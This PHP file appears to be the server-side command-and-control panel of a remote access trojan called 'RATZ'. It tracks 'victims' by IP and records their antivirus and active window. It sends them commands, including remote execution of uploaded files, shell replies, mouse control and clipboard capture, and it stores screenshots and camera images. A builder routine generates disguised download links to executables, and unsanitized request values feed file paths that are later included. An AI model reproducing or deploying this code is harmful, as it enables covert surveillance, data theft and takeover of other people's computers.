<?php
// Client only made by https://github.com/Flysre/
// Indentation is not respected because its not suposed to be read by casual people as everything is already suposed to be writen
// Yes i don't use same identation that anyone else ¯\_(ツ)_/¯



if (isset($_GET["action"])) {$action = $_GET["action"];} else {echo "Invalid POST usage";}    // Action indicate client.php what we want do do
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (isset($_GET["ping"])) {$ping = $_GET["ping"];}                                           // Ping between client & server send in action=writeme
if (isset($_GET["ram"])) {$ram = $_GET["ram"];}                                              // ram usage (%) send in action=writeme
if (isset($_GET["cpu"])) {$cpu = $_GET["cpu"];}                                              // cpu usage (%) send in action=writeme
if (isset($_GET["uptime"])) {$uptime = $_GET["uptime"];}                                     // stub uptime (s) send in action=writeme
if (isset($_GET["avname"])) {$avname = $_GET["avname"];}                                     // antivirus detected send in action=writeme
if (isset($_GET["softwarename"])) {$softwarename = $_GET["softwarename"];}                   // stub name send in action=writeme
if (isset($_GET["currentwindow"])) {$currentwindow = base64_encode($_GET["currentwindow"]);} // current window victim browse send in action=writeme IN BASE64 to avoid string escape
if (isset($_GET["target"])) {$target = $_GET["target"];}                                     // TARGET have to be use when sending instruction from panel
if (isset($_GET["actiontype"])) {$actiontype = $_GET["actiontype"];}                         // Actiontype return the action the stub have to do : Start a file)
if (isset($_GET["actioncontent"])) {$actioncontent = $_GET["actioncontent"];}                // actioncontents declare destails about Actiontype   ^^^^ filename
if (isset($_GET["actioncontent2"])) {$actioncontent2 = $_GET["actioncontent2"];}             // Even More details about possible actions that need to be transfered
$actioncontent3 = $_GET["actioncontent3"];                                                   //
$actioncontent4 = $_GET["actioncontent4"];                                                   //
$actioncontent5 = $_GET["actioncontent5"];                                                   // 
$victim = $_SERVER['REMOTE_ADDR'];                                                           // victim return page visitor ip (on used occurence the victim IP)  
$actionid = randomstring(5);                                                                 // actionid is used when sending a message in chatbox(check if message is not the same)
$date = date("[H:i:s d-m-Y]");                                                               // date is here in case i need it
$servip = $_SERVER['SERVER_ADDR'];                                                           // VPS IP used when building the rat
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



// My little trash of things to do and to setup
// $http_x_headers = explode( ',', $_SERVER['HTTP_X_FORWARDED_FOR'] );$_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; // For Cloudflare DNS , bypass to get client IP
// if ($action == "@everyone") { setup in victim stubs to read everyone instruction (such as start a remote file)}
//
//
///////////////////////////////////////////////////////





// writeme is used when victim send his status
if ($action == "writeme") {
  echo cache_get($victim . "actions");
// When victim browse, it will try to create the if doesn't exist
// $victim = Refer to line 10
if (!is_dir("victims/$victim")) {mkdir("victims/$victim", 0777); chmod("victims/" . $victim, 0777);}
// Touch will update file creation date (if file already exist = actual user = update last time seen)
touch("victims/$victim");
// When victim browse the url , if an action have been send by the panel ,it will be returned to the stub
echo(cache_get($victim . "actions"));
// After action got readed, directly removing it because its perfectly recieved by victim
cache_set($victim . "actions" , "");
// we set in victim . "stats" (= 1.2.3.4stats) the actual stat of the victim that will be returned as json to the panel
cache_set($victim . "stats" , "{\"ip\":\"$victim\",\"ping\":\"$ping\",\"cpu\":\"$cpu\",\"ram\":\"$ram\",\"currentwindow\":\"$currentwindow\",\"uptime\":\"$uptime\",\"softwarename\":\"$softwarename\",\"avname\":\"$avname\"}[;;]");
// If there is not folder $victim then its a new client onlie, and we write files for it
if (!is_dir("logs/$victim")) {
mkdir("logs/$victim"); chmod("logs/$victim", 0777);
mkdir("logs/$victim/screenshots"); chmod("logs/$victim/screenshots", 0777);
mkdir("logs/$victim/camerashot"); chmod("logs/$victim/camerashot", 0777);
// Refer to Line 6 to uptime. 
// If uptime is superior at TWO then the victim is not new and is online for more than two seconds
} else {  if ($uptime > 2) { return; }     }    }
///////////////////////////////////////////////////////





// ChatBox Zone
// we set in target . adminchat (= 1.2.3.4adminchat) datas about the chat :
// $actioncontent = Show in victim Taskbar ? (0 No // 1 Yes)      /// $actionconent2 = Always on top ? (0 No // 1 Yes)    /// $actioncontent3= Victim can close chat ? (0 No // 1 Yes)
// $actioncontent4 get transformet in $encrypted in Base64 to avoir string escape
if ($action == "adminsend") {     cache_set($target . "adminchat" , "$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4|$actionid"); }
// adminrecieve return encrypted message in base64 and actionID (refer to line 19)
if ($action == "adminreceive") {     echo(cache_get($target . "clientchat"));     }
// we set in victim . clientchat (= 1.2.3.4clientchat) datas about the chat :
// $encrypted is base64 string containing message content and actionID (refer to line 19)
if ($action == "clientsend") {     cache_set($victim . "clientchat", "$actioncontent|$actionid");     }
// clientrecieve return encrypted message in base64 with all informations about tchatbox (should i be always on top ? can i close the chat ? etc..)
if ($action == "clientreceive") {     echo(cache_get($victim . "adminchat"));     }	
///////////////////////////////////////////////////////

// Send instruction to do to $target . action (= 1.2.3.4actions) with actiontype (start remote desktop) and actioncontent for different action
if ($action == "senddata") {    cache_set($target . "actions", "$actiontype|$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4|$actioncontent5");  }
///////////////////////////////////////////////////////

// Recieve uploaded file of screen by victim and save it in $actioncontent as the file name
if ($action == "uploadscreenshot") {    $byte = file_get_contents("php://input");   file_put_contents("logs/$victim/screenshots/$actioncontent.jpeg", $byte);     }
///////////////////////////////////////////////////////

// Recieve uploaded file of camera by victim and save it in $actioncontent as file name (Camera not coded)
if ($action == "uploadcamerashot") {    $byte = file_get_contents("php://input");   file_put_contents("logs/$victim/camerashot/$actioncontent.jpeg", $byte);  }
///////////////////////////////////////////////////////

// Recieved file by panel is in files in $actioncontent as file name
if ($action == "remoteexec") { move_uploaded_file($_FILES["file"]["tmp_name"], "files/$actioncontent");
// Send instruction to victim to download the file & exec it (remotexec directly refer to files folder on server & $actioncontent as filename)
cache_set($victim . "actions" , "remotexec|$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4");  }
///////////////////////////////////////////////////////

// Edit shellreply content from victim
if ($action == "sendhellreply") {     cache_set($victim . "shellreply" , "$actioncontent");     }
///////////////////////////////////////////////////////

// Get shellreply content from target
if ($action == "getshellreply") {     cache_get($target . "shellreply"); cache_set($target . "shellreply", "");     }
///////////////////////////////////////////////////////

// Used by stub for remote screen and constantly save the file
if ($action == "uploadimage") {		file_put_contents("victims/$victim/screenshot", file_get_contents("php://input"));     }
///////////////////////////////////////////////////////

// Used by Panel to return when screenshare if they have to remote desktop xPos|yPos|ClickType(left , right , double , drag)
if ($action == "sendcords") {	cache_set($target . "mousecords" , "$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4");}
///////////////////////////////////////////////////////

// Coordinates returned when panel enable remote control, then clean because datas succesfully recieved by victim and victim moved mouse
if ($action == "getcords") {	echo cache_get($victim . "mousecords"); cache_set($victim . "mousecords","");	}
///////////////////////////////////////////////////////

// Action @everyone is used by pannel to send instruction to ALL victims actualy Online
if ($action == "@everyone") {	 $victims = array_diff(scandir('victims/'), array('.', '..'));
foreach($victims as $list){ cache_set($list . "action" ,"$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4|$actioncontent5"); 	}	}

// Datas send / recieved correctly but didn't finished victim to send instruction & pannel to recieve
if ($action == "sendtasks") {	cache_set($victim . "taskmgr" , "$actioncontent");	}
if ($action == "gettasks") {	echo(cache_get($target . "taskmgr"));	cache_set($target . "taskmgr",""); }
///////////////////////////////////////////////////////

// Clipboard send / return by  pannel to stub
if ($action == "sendclipboard") { cache_set($victim . "clipboard" , "$actioncontent");  }
if ($action == "getclipboard") {  echo(cache_get($target . "clipboard")); cache_set($target . "clipboard",""); }
///////////////////////////////////////////////////////

// Stats send / return by pannel to stub
if ($action == "sendstatistics") { cache_set($victim . "statistics" , "$actioncontent");  }
if ($action == "getstatistics") {  echo(cache_get($target . "statistics")); cache_set($target . "statistics",""); }
///////////////////////////////////////////////////////


// Not working because we need to get VPS file path to send it to convertmp3 (wich use public link to convert file..........)
// if ($action == "playmp3") {
// $filename = randomstring(10) . ".wav";
// move_uploaded_file($_FILES["file"]["tmp_name"], "files/$actioncontent");
// convertmp3("files/" . $actioncontent,  $filename);
// cache_set($victim . "actions" , "playmp3|$filename|$actioncontent2|$actioncontent3|$actioncontent4");
// }
	
// Clean it is send  by panel every interval to clear the folder (refer line 34)
// And get stats for the victim
if ($action == "cleanit") {     $victims = array_diff(scandir('victims/'), array('.', '..'));
// For each files in victims/ (1 File = One IP = One victim) then we get victim . stats (=  1.2.3.4stats)
// Edited : File is not regulary deleted by PHP, but deleted directly if Folder of the victim didn't got updated at least 5seconds ago
// When $action=writeme // The script update the last edited file time so restet the "timer" to 5s before file deleted
// Maybe will put the max uptime to 6
foreach($victims as $list){
$dir = stat("victims/$list");
if ($dir['mtime'] < (Time() - 4)) { 
exec("rm -r victims/$list"); 
cache_set($list . "adminchat" , ""); cache_set($list . "clientchat" , ""); cache_set($list . "target" , ""); 
} else {echo (cache_get($list . "stats"));		}

}

}
// We delete the victim file and write it, victims actualy online  will make a writeme (refer to line 34) to be put as Line34
// exec("rm -r victims"); mkdir("victims" , 0777 , true); chmod("victims", 0777);  
///////////////////////////////////////////////////////





/////// Here to use later as logs, hard to correctly use so just not storing logs for the moment
//
//        function write_logs($content , $type , $victim){
//        if ($type == "connections") {$loc = "logs/$victim/connections.html";}
//        if ($type == "informative") {$loc = "logs/$victim/informative.html";}
//        if ($type == "actions")     {$loc = "logs/$victim/actions.html";
//        if ($actiontype == "runwincmd") {$content = "<p>$date User Launched Shell action : <b>$actioncontent</b></p>";}}
//        file_put_contents($loc , $content . "<br>", FILE_APPEND);}
//
/////////////////////////////////////////////////////////



// BUILDER FILE CREATOR
if ($action == "buildrat") {
$foldername = array("videourl" ,"uploads", "profiles" , "readme" , "versions", "updates");
$phpfiles = array("download.php" , "profile.php", "scanner.php", "install.php" , "update.php" , "images.php" , "browse.php" , "logout.php");
$extensiontype = array("?phpid=" , "?fileid=", "?executable=", "?filename=" ,"?id=", "?imagepath=", "?version=","?number=" , "?date=" , "?password=");
$selectedfoldername = $foldername[mt_rand(0, count($foldername) - 1)];
$selectedphpfile = $phpfiles[mt_rand(0, count($phpfiles) - 1)];
$selectedextensiontype = $extensiontype[mt_rand(0, count($extensiontype) - 1)];
if (!is_dir("$selectedfoldername")) { mkdir("$selectedfoldername", 0777); chmod("$selectedfoldername", 0777);}
$template = file_get_contents("download.php");
if (!file_exists("$selectedfoldername/$selectedphpfile")) { file_put_contents("$selectedfoldername/$selectedphpfile" , $template);}
$totalpath = "$selectedfoldername/$selectedphpfile$selectedextensiontype";
$fpath = base64_encode("files/" . randomstring(10) . ".exe");
echo "http://" . $servip . "/RATZ/" . $totalpath . $fpath;
}







// cache_get("valeur") return string with the value stored in it ( "" is returned when nothing )
function cache_get($key) {
    @include "/tmp/$key";
    return isset($val) ? $val : false;
}
/////////////////////////////////////////////////


// cache_set($nom , $contenue) save the string name and the  value.
function cache_set($key, $val) {
   $val = var_export($val, true);
   $val = str_replace('stdClass::__set_state', '(object)', $val);
   $tmp = "/tmp/$key." . uniqid('', true) . '.tmp';
   file_put_contents($tmp, '<?php $val = ' . $val . ';', LOCK_EX);
   rename($tmp, "/tmp/$key");     }
/////////////////////////////////////////////////


// Used to get a random string
function randomstring($n) { 
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
     $randomString = ''; 
     for ($i = 0; $i < $n; $i++){ 
          $index = rand(0, strlen($characters) - 1); 
          $randomString .= $characters[$index]; 
     }
return $randomString;      } 
/////////////////////////////////////////////////
function convertmp3($url,$filename){
$data = json_decode(file_get_contents('http://api.rest7.com/v1/sound_convert.php?url=' . $url . '&format=wav'));
$wave = file_get_contents($data->file);
file_put_contents("files/" . $filename , $wave);
}
?> 